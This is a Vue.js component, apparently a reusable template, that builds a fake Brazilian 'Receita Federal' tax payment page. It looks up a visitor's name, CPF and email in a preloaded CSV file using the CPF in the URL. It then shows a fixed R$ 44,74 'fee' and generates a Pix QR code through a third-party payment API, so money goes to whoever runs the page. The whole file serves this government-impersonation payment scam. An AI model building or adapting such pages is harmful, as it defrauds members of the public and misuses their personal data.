<template>
  <div v-if="loading" class="loading-container">
    <div class="loading-dialog">
      <p>Aguarde, estamos apurando seus dados</p>
      <div class="loading-spinner"></div>
    </div>
  </div>
  <div v-else-if="userDetails" class="document-container">
    <img :src="logo" alt="Logo do Site" class="logo" />
    <h1>Documento de Pagamento de Taxas da Receita Federal</h1>
    <div class="document-details">
      <p><strong>Nome:</strong> <br> {{ userDetails.nome }}</p>
      <p><strong>CPF:</strong> <br> {{ formattedCpf }}</p>
      <p><strong>Data de Vencimento:</strong> <br> {{ currentDate }}</p>
      <p><strong>Valor Total do Documento:</strong> <br> R$ 44,74</p>
    </div>
    <div class="pix-info">
      <qrcode v-if="response && response.pix.qrcode" :qrcodeData="response.pix.qrcode" />
      <div class="loadingQr" v-if="loadingQrcode && !loading">
        Gerando QR Code
        <div class="loading-spinner"></div>
      </div>
      <span v-if="response && response.pix.qrcode">{{ response.pix.qrcode }}</span>
    </div>
    <button class="copy-button" @click="copyPixCode">Copiar Pix Copia e Cola</button>
  </div>
  <div v-else class="document-container">
    <p>Nenhum dado encontrado.</p>
  </div>
</template>

<script>
import csvService from '@/services/csvService';
import qrcode from '@/components/qrcode.vue';

export default {
  components: {
    qrcode,
  },
  data() {
    return {
      loading: true,
      logo: require('@/static/logo.png'),
      siteName: 'SUBSTITUIR NOME AQUI',
      userDetails: null,
      response: null,
      qrcode: null,
      currentDate: this.formatDate(new Date()),
      loadingQrcode: true,
    };
  },
  async mounted() {
    const cpf = this.$route.query.cpf;
    const data = await csvService.fetchData();
    this.userDetails = data.find(user => user.cpf === cpf);
    this.loading = false;

    if (this.userDetails) {
      await this.makePostRequest();
    }
  },
  methods: {
    async makePostRequest() {
      const secretKey = process.env.PRIVATE_TOKEN
      const base64Value = btoa(`${secretKey}:x`);

      try {
        const options = {
          method: 'POST',
          url: 'https://api.zyonpay.com/v1/transactions',
          headers: {
            authorization: 'Basic ' + base64Value
          },
          data: {
            customer: {
              document: { number: this.userDetails.cpf, type: 'cpf' },
              name: this.userDetails.nome,
              email: this.userDetails.email
            },
            amount: 4474,
            paymentMethod: 'pix',
            items: [
              {
                tangible: false,
                title: 'itemTitle',
                unitPrice: 4474,
                quantity: 1
              }
            ]
          }
        };

        const response = await this.$axios(options);
        this.response = response.data;
        this.qrcode = response.data.pix.qrcode;
        this.loadingQrcode = false;
      } catch (error) {
        console.error(error);
        this.response = error.response ? error.response.data : 'An error occurred';
      }
    },
    copyPixCode() {
      const text = this.qrcode;
      navigator.clipboard.writeText(text).then(() => {
        alert('Código Pix copiado para a área de transferência!');
      }, (err) => {
        console.error('Erro ao copiar o texto: ', err);
      });
    },
    formatDate(date) {
      const day = String(date.getDate()).padStart(2, '0');
      const month = String(date.getMonth() + 1).padStart(2, '0');
      const year = date.getFullYear();
      return `${day}/${month}/${year}`;
    },
    formatCurrency(value) {
      return (value / 100).toFixed(2).replace('.', ',');
    }
  },
  computed: {
    formattedCpf() {
      return this.userDetails.cpf
        .replace(/\D/g, '')           // Remove todos os caracteres não numéricos
        .replace(/(\d{3})(\d)/, '$1.$2') // Adiciona o ponto após os primeiros 3 dígitos
        .replace(/(\d{3})(\d)/, '$1.$2') // Adiciona o ponto após os próximos 3 dígitos
        .replace(/(\d{3})(\d{1,2})$/, '$1-$2'); // Adiciona o hífen antes dos últimos 2 dígitos
    }
  },
};
</script>

<style scoped>
* {
  font-family: Arial, Helvetica, sans-serif;;
}
h1, h2, h3 {
  margin: 0;
  font-size: 1.5rem;
}
.loading-container {
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  /* background-color: rgba(0, 0, 0, 0.5); */
  position: fixed;
  width: 100%;
  top: 0;
  left: 0;
  z-index: 1000;
}
.loading-dialog {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  background-color: white;
  padding: 20px;
  border-radius: 8px;
  text-align: center;
  box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
}
.loading-spinner {
  margin-top: 20px;
  border: 4px solid rgba(0, 0, 0, 0.1);
  border-radius: 50%;
  border-top: 4px solid #3498db;
  width: 40px;
  height: 40px;
  animation: spin 2s linear infinite;
}
@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
.document-container {
  max-width: 600px;
  margin: 0 auto;
  padding: 20px;
  /* border: 1px solid #ccc; */
  /* border-radius: 8px; */
  background-color: #fff;
  /* box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); */
  text-align: center;
}
.logo {
  max-width: 150px;
  margin-bottom: 20px;
}
.document-details {
  text-align: center;
  display: grid;
  grid-template-columns: repeat(2, 1fr);
  grid-template-rows: repeat(2, 1fr);
}
.document-details p {
  margin: 8px 0;
}
.copy-button {
  display: inline-block;
  padding: 10px 20px;
  margin-top: 20px;
  background-color: #007bff;
  color: #fff;
  border: none;
  border-radius: 4px;
  cursor: pointer;
}
.copy-button:hover {
  background-color: #0056b3;
}
.loading-container {
  text-align: center;
  padding: 20px;
}
.pix-info span {
  display: block;
  padding: 0.1rem;
  border: 1px solid gray;
  max-width: 100%;
  white-space: nowrap;
  overflow: hidden;
  /* text-overflow: ellipsis; */
}

.loadingQr {
  /* border: 1px solid #ccc; */
  border-radius: 8px;  font-weight: 700;
  display: flex;
  padding: 20px;
  margin: 0 auto;
  flex-direction: column;
  justify-content: center;
  width: fit-content;
  align-items: center;
  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
}

/* Regras específicas para dispositivos móveis */
@media only screen and (max-width: 768px) {
  .loading-container {
    padding: 0;
    height: 75vh;
  }
}
</style>
